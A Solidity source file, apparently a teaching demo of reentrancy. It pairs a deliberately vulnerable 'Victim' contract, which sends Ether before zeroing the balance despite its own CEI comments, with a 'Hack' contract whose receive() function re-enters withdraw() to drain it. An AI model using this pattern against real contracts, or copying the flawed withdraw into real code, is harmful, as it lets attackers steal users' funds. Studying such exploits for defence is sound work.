// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;


contract Victim {
mapping (address => uint) public balances;

function deposit() public payable {
 balances[msg.sender] += msg.value;
}
// CEI Pattern 
// Checks
// Effects
// Interactions

// CEI
// update storage before making transfer

 function withdraw() public {
 uint bal = balances[msg.sender];
 require(bal > 0); // Check

(bool sent, ) = msg.sender.call{value: bal}(""); // Interaction
require(sent, "Failed to send Ether");

 balances[msg.sender] = 0; // Effect
 }
}


contract Hack {
    Victim public  vitim;


    mapping (address => uint) public balances;

    constructor (address _vitim) {
        vitim = Victim(_vitim);
    }

    function hacker() external payable {
        require(msg.value >= 1 ether, "insufficiency ");
        vitim.deposit{value: 1 ether}();




    }

    function withdraw() external payable {
            vitim.withdraw();
    }

    receive() external payable { 
        if(address(vitim).balance > 0) {
                        vitim.withdraw();

        }
    }


}